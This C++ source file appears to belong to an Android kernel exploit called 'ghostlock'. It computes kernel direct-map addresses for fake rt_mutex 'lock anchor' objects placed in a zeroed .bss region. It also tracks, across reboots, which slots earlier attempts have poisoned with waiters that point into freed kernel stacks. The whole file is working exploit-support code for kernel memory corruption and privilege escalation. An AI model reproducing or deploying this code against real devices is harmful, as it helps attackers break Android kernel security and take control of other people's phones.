#include "route/lock_anchor.h"

#if defined(__ANDROID__)
#include "common.h"

#include <cstdio>
#include <cstring>
#include <string>

#include "kernel/target.h"
#include "session/exploit_session.hpp"
#include "session/runtime_config.h"
#include "session/runtime_paths.h"

using namespace ghostlock;

namespace ghostlock::route::anchor {
    namespace {
        /* The fake rt_mutex is 0x20 bytes: wait_lock, two rb words, owner. Only
         * the rb words are ever written, so a 0x20 stride cannot overlap. */
        constexpr uintptr_t kLockAnchorStrideDefault = 0x20;
        constexpr uintptr_t kLockAnchorBytesDefault = 0x1000;
        constexpr uintptr_t kLockAnchorStrideMin = 0x20;

        /* The chunk's end is persisted before any slot in it is handed out, so
         * a run that dies mid-chunk only skips the rest of the chunk. */
        constexpr uintptr_t kLockAnchorChunk = 8;

        /* False when the two keys cannot describe one grid; the caller must
         * fail, not fall back. */
        bool geometry_from(const std::optional<uint64_t> &bytes_key,
                           const std::optional<uint64_t> &stride_key,
                           Geometry *out) {
            const uintptr_t stride = stride_key
                                         ? static_cast<uintptr_t>(*stride_key)
                                         : kLockAnchorStrideDefault;
            const uintptr_t bytes = bytes_key
                                        ? static_cast<uintptr_t>(*bytes_key)
                                        : kLockAnchorBytesDefault;
            if (stride < kLockAnchorStrideMin || bytes == 0 || bytes % stride != 0) {
                pr_error("[route] anchor geometry unusable (bytes=0x%llx stride=0x%llx): bytes must be a "
                         "non-zero multiple of the stride, and the stride at least 0x%llx -- the fake "
                         "rt_mutex reaches owner@+0x18, so closer slots share a word\n",
                         static_cast<unsigned long long>(bytes),
                         static_cast<unsigned long long>(stride),
                         static_cast<unsigned long long>(kLockAnchorStrideMin));
                return false;
            }
            out->stride = stride;
            out->bytes = bytes;
            out->slots = bytes / stride;
            return true;
        }

        bool read_boot_id(char *out, size_t capacity) {
            FILE *f = fopen("/proc/sys/kernel/random/boot_id", "r");
            if (!f) return false;
            const bool ok = fgets(out, static_cast<int32_t>(capacity), f) != nullptr;
            fclose(f);
            if (!ok) return false;
            for (size_t i = 0; out[i] != '\0'; i++) {
                if (out[i] == '\n') {
                    out[i] = '\0';
                    break;
                }
            }
            return out[0] != '\0';
        }

        /* Persist the reservation before the slot is handed out; the grid is
         * stamped too, so a file from a different stride/region is not resumed. */
        bool write_anchor_state(const std::string &path, const char *boot_id,
                                uintptr_t next_slot, uintptr_t slots) {
            FILE *f = fopen(path.c_str(), "w");
            if (!f) return false;
            const int32_t written = fprintf(f, "%s %llu %llu\n", boot_id,
                                            static_cast<unsigned long long>(next_slot),
                                            static_cast<unsigned long long>(slots));
            const bool ok = written > 0 && fflush(f) == 0;
            fclose(f);
            return ok;
        }

        /* Boot-scoped, monotonic across processes. A run poisons every slot it
         * uses: the fake waiter points into a freed kernel stack, so a later
         * walk reaching it data-aborts. */
        uintptr_t allocate_slot(const Geometry &geom) {
            static bool loaded = false;
            static char boot_id[64] = {};
            static std::string state_path;
            static uintptr_t next = 0;      /* next slot to hand out */
            static uintptr_t reserved = 0;  /* high-water mark already in the file */
            static uintptr_t loaded_slots = 0;

            if (loaded && loaded_slots != geom.slots) {
                /* One profile per process today; a second grid against the
                 * first's high-water mark would hand out undescribed slots. */
                pr_error("[route] anchor geometry changed mid-process (%llu -> %llu slots); "
                         "refusing to reuse this boot's slot state\n",
                         static_cast<unsigned long long>(loaded_slots),
                         static_cast<unsigned long long>(geom.slots));
                return geom.slots;
            }

            if (!loaded) {
                loaded = true;
                loaded_slots = geom.slots;
                state_path = config::anchor_state_file(config::runtime_config_snapshot().home_dir);
                if (!read_boot_id(boot_id, sizeof boot_id)) {
                    /* Unreadable /proc reads as "same boot": the conservative
                     * interpretation, since a real reboot is provable elsewhere. */
                    std::strncpy(boot_id, "unknown-boot", sizeof boot_id - 1);
                }

                char stored_boot[64] = {};
                unsigned long long stored_next = 0;
                unsigned long long stored_slots = 0;
                bool have_boot = false;
                bool have_all = false;
                if (FILE *f = fopen(state_path.c_str(), "r")) {
                    /* The boot id alone is authoritative; the rest only means
                     * anything within the boot that wrote it. */
                    have_boot = fscanf(f, "%63s", stored_boot) == 1;
                    if (have_boot) {
                        have_all = fscanf(f, "%llu %llu", &stored_next, &stored_slots) == 2;
                    }
                    fclose(f);
                }
                const bool same_boot = have_boot && std::strcmp(stored_boot, boot_id) == 0;
                const bool grid_ok = have_all && stored_slots == geom.slots;

                if (same_boot && grid_ok && stored_next <= geom.slots) {
                    next = static_cast<uintptr_t>(stored_next);
                    pr_info("[route] anchor slots: %llu/%llu already spent this boot\n",
                            static_cast<unsigned long long>(next),
                            static_cast<unsigned long long>(geom.slots));
                } else if (have_boot && !same_boot) {
                    pr_info("[route] anchor slots: new boot, region zeroed again; "
                            "starting at 0/%llu\n",
                            static_cast<unsigned long long>(geom.slots));
                } else if (same_boot && have_all) {
                    /* Same boot, untrustworthy grid or count: the region is
                     * still poisoned and the file cannot say where. */
                    pr_error("[route] anchor state is not usable for this build "
                             "(grid %llu vs %llu, next %llu); reboot the device and run again\n",
                             stored_slots, static_cast<unsigned long long>(geom.slots),
                             stored_next);
                    next = geom.slots;
                } else if (config::runtime_config_snapshot().anchor_trusted) {
                    /* The app proved this install predates the boot, so a
                     * missing file means the region is still zeroed. */
                    if (!write_anchor_state(state_path, boot_id, 0, geom.slots)) {
                        pr_error("[route] anchor slot state is missing and cannot be created in %s; "
                                 "refusing to start from a slot this boot may already have spent\n",
                                 state_path.c_str());
                        next = geom.slots;
                    } else {
                        pr_info("[route] anchor slots: no state file and this install predates the "
                                "boot; starting at 0/%llu\n",
                                static_cast<unsigned long long>(geom.slots));
                    }
                } else {
                    /* No usable file and no safe guess; 0 is the one slot a
                     * previous run is guaranteed to have used. */
                    pr_error("[route] anchor slot state missing/unusable (%s); cannot tell which "
                             "slots this boot already spent -- reboot the device and run again\n",
                             state_path.c_str());
                    next = geom.slots;
                }
            }

            if (next >= geom.slots) return geom.slots;
            if (next >= reserved) {
                /* Persist the chunk's end before handing out a slot from it. */
                uintptr_t want = next + kLockAnchorChunk;
                if (want > geom.slots) want = geom.slots;
                if (!write_anchor_state(state_path, boot_id, want, geom.slots)) {
                    pr_error("[route] cannot record the anchor slot reservation in %s; refusing to "
                             "hand out a slot a later process would be given again\n",
                             state_path.c_str());
                    return geom.slots;
                }
                reserved = want;
                pr_info("[route] anchor slots: reserved %llu..%llu of %llu\n",
                        static_cast<unsigned long long>(next),
                        static_cast<unsigned long long>(reserved - 1),
                        static_cast<unsigned long long>(geom.slots));
            }
            return next++;
        }
    } // namespace

    std::uintptr_t acquire_lock_word(const std::uint64_t image,
                                     const std::optional<std::uint64_t> bytes,
                                     const std::optional<std::uint64_t> stride,
                                     const int32_t attempt,
                                     std::uintptr_t *slot_out) noexcept {
        if (slot_out) *slot_out = 0;
        Geometry geom = {};
        if (!geometry_from(bytes, stride, &geom)) return 0;
        const uintptr_t slot = allocate_slot(geom);
        if (slot >= geom.slots) {
            pr_error("[route] anchor slot budget for this boot is spent (%llu slots of "
                     "0x%llx bytes at stride 0x%llx, one per attempt); refusing to walk "
                     "past the zeroed region into live .bss -- reboot to reset it\n",
                     static_cast<unsigned long long>(geom.slots),
                     static_cast<unsigned long long>(geom.bytes),
                     static_cast<unsigned long long>(geom.stride));
            return 0;
        }
        const uintptr_t rotation = geom.stride * slot;
        const uintptr_t lock_word = session::g_exploit_session.addresses.data_alias(
            static_cast<uintptr_t>(kernel::KIMAGE_TEXT_BASE + image) + rotation);
        pr_info("[route] lock anchor: image +0x%llx (attempt %d, slot %llu, "
                "+0x%llx) -> direct map 0x%llx\n",
                static_cast<unsigned long long>(image), attempt,
                static_cast<unsigned long long>(slot),
                static_cast<unsigned long long>(rotation),
                static_cast<unsigned long long>(lock_word));
        if (slot_out) *slot_out = slot;
        return lock_word;
    }
} // namespace ghostlock::route::anchor
#endif // __ANDROID__
